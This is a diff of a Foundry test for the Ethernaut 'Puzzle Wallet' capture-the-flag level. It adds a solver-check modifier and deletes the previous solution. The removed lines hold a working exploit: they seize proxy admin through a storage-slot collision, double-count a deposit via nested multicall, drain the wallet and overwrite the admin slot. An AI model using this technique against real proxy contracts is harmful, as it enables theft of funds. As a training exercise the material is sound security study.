@@ -20,6 +20,12 @@ contract TestPuzzleWallet is Test, Utils {
                                  HELPERS
     //////////////////////////////////////////////////////////////*/
 
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        assertTrue(submitLevelInstance(ethernaut, address(instance)));
+    }
+
     function setUp() public {
         address payable[] memory users = createUsers(2);
 
@@ -51,24 +57,7 @@ contract TestPuzzleWallet is Test, Utils {
     }
 
     /// @notice Test the solution for the level.
-    function testSolve() public {
-        vm.startPrank(player);
+    function testSolve() public checkSolvedByPlayer{
 
-        PuzzleProxy(payable(address(instance))).proposeNewAdmin(player);
-
-        instance.addToWhitelist(player);
-
-        bytes[] memory callsDeep = new bytes[](1);
-        callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-
-        bytes[] memory calls = new bytes[](2);
-        calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
-        calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);
-        instance.multicall{value: 0.001 ether}(calls);
-
-        instance.execute(player, 0.002 ether, "");
-        instance.setMaxBalance(uint256(uint160(address(player))));
-
-        assertTrue(submitLevelInstance(ethernaut, address(instance)));
     }
 }
